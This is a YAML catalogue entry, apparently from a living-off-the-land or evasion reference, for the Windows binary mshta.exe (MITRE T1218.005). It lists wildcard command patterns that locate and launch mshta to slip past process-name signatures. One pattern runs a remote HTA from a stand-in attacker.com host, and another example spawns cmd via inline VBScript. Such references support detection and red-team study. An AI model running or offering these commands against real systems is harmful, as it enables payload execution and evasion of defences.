---
Name: mshta
Description: "Microsoft HTML Application host. Executes HTA files or inline VBScript/JScript — commonly used for payload execution and initial access."
Platform: windows-cmd
BinaryPath:
  - C:\Windows\System32\mshta.exe
  - C:\Windows\SysWOW64\mshta.exe
Category: execution
MitreID: T1218.005
Patterns:
  - Pattern: "for /f %i in ('where mshta*') do %i http://attacker.com/payload.hta"
    Wildcards: ["*"]
    Notes: "Star matches '.exe'"
  - Pattern: "for /f %i in ('where m*ta.exe') do %i"
    Wildcards: ["*"]
    Notes: "Star replaces 'sh'"
  - Pattern: "for /f %i in ('where ms?ta.exe') do %i"
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'h'"
  - Pattern: "for /f %i in ('dir /b C:\\Windows\\System32\\ms*ta.exe') do %i"
    Wildcards: ["*"]
    Notes: "dir glob search"
PlatformNotes: |
  mshta.exe can run HTA files from local paths or URLs. Example: `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd"":close")`. Blocked by many modern AV products but glob name obfuscation may bypass signature matching on process names.
Resources:
  - https://attack.mitre.org/techniques/T1218/005/
  - https://lolbas-project.github.io/lolbas/Binaries/Mshta/
---
